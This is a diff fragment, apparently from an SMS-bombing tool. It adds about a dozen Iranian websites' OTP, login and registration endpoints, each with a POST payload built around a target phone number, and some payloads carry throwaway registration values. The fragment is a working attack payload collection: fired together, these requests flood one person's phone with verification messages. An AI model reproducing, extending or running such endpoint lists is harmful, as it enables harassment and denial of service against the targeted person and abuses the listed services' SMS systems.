@@ -1227,12 +1227,41 @@ asangem.com
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
 new url:
+zabane python:FARBODxME
+('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
+
+        'microele': ('https://www.microele.com/login?back=my-account', {
+            'id_customer': '','back':',my-account',
+            'firstname': '123','lastname':'123',
+            'password': '123456','action':'register',
+            'username':'0' + number,'ajax':'1'
+        }),
+
+        'telketab': ('https://telketab.com/opt_field/check_secret', {
+            'identity': '0' + number,
+            'secret': '',
+            'plugin': 'otp_field_sms_processor',
+            'key': 'otp_field_user_auth_form__otp_sms',
+        }),
+
+('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
+
+        'techsiro': ('https://techsiro.com/send-otp', {
+            'client': 'web','method':'POST','_token':'',
+            'mobile':'0' + number
+        }),
+
+('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
 
 
+     ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+       
+
+ ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
 
 
-
-
+('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
